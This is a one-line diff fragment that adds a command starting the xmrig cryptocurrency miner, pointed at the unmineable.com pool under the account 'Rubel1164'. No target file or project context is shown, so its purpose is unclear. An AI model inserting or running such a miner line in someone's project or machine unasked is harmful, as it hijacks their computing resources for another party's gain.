@@ -1,0 +1,1 @@
+./xmrig -a rx -o stratum+tcp://rx.unmineable.com:3333 -u Rubel1164 -p x1
